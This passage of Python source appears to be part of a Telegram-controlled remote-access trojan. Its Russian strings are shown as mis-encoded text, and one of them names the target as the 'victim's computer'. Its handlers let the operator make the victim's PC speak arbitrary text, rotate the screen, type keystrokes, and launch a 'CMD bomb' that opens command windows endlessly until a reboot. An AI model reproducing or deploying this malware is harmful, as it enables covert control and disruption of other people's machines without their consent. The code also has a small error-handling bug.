    @dp.message_handler(text_contains='–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç')
    async def sayhello(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ —è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥—É –µ–≥–æ –∫–∞–∫ –∑–≤—É–∫ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –∂–µ—Ä—Ç–≤—ã')
            await Steps.stepSayHello.set()


    @dp.message_handler(state=Steps.stepSayHello)
    async def sayhello_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            s = pyttsx3.init()
            s.say(message.text)
            s.runAndWait()
            await bot.edit_message_text("–£—Å–ø–µ—à–Ω–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤—ë–ª ‚úÖ", admin_id, msg.message_id, parse_mode="HTML")




def Rotate(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–æ–≤–µ—Ä–Ω—É—Ç—å –º–æ–Ω–∏–∫')
    async def sayhello(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ –≥—Ä–∞–¥—É—Å—ã: 0, 90, 180 –∏–ª–∏ 270')
            await Steps.stepRotate.set()

    @dp.message_handler(state=Steps.stepRotate)
    async def rotate_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:
            
            Rotations = {
                '0': win32con.DMDO_DEFAULT,
                '90': win32con.DMDO_90,
                '180': win32con.DMDO_180,
                '270': win32con.DMDO_270
            }
            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                RotationValue = Rotations[message.text]
            except KeyError:
                await bot.send_message(admin_id, '–í–≤–µ–¥–∏ —Ç–æ–ª—å–∫–æ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–µ –≥—Ä–∞–¥—É—Å—ã: 0, 90, 180 –∏–ª–∏ 270')
            Device = win32api.EnumDisplayDevices(None, 0)
            dm = win32api.EnumDisplaySettings(Device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
            if (dm.DisplayOrientation + RotationValue) % 2 == 1:
                dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth   
            dm.DisplayOrientation = RotationValue
            win32api.ChangeDisplaySettingsEx(Device.DeviceName, dm)


def WriteText(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç')
    async def writetext(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û–∫, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Ç–µ–∫—Å—Ç')
            await Steps.stepWrite.set()

    @dp.message_handler(state=Steps.stepWrite)
    async def writetext_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:

            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                keyboard.write(message.text, delay=0.1)
            except Exception as e:
                await bot.send_message(admin_id, e)
            






def CMDBomb(dp, bot, admin_id):
    @dp.message_handler(text_contains='CMD –ë–æ–º–±–∞')
    async def cmdbomb(message: types.Message):
        if message.from_user.id == admin_id:
            global msg
            msg = await bot.send_message(admin_id, '–û—Å—Ç–æ—Ä–æ–∂–Ω–æ ‚ùóÔ∏è\n–ï—Å–ª–∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ, –ø–æ–º–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ –ø–µ—Ä–µ–∑–≥—Ä—É–∑–∫–∞ –ü–ö.\n–í–≤–µ–¥–∏ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ —Ö–æ—Ç–∏—Ç–µ –æ—Ç–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å: \n–ï—Å–ª–∏ —Ö–æ—á–µ—à—å –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ, —Ç–æ –≤–≤–µ–¥–∏ 911')
            await Steps.stepCMD.set()

    @dp.message_handler(state=Steps.stepCMD)
    async def cmdbomb_dev(message: types.Message, state: FSMContext):
        if message.from_user.id == admin_id:

            await state.update_data(
                {
                    'item': message.text
                }
            )
            await state.finish()
            try:
                item = int(message.text)
                await bot.send_message(admin_id, '–ê—Ç–∞–∫–∞ –Ω–∞—á–∞–ª–∞—Å—å')
                if item == 911:
                    while True:
                        os.startfile('cmd.exe')
                else:
                    for i in range(0, item):
                        os.startfile('cmd.exe')
            except:
                await bot.send_message(admin_id, '–í–≤–µ–¥–∏ —Ü–∏—Ñ—Ä—ã?!')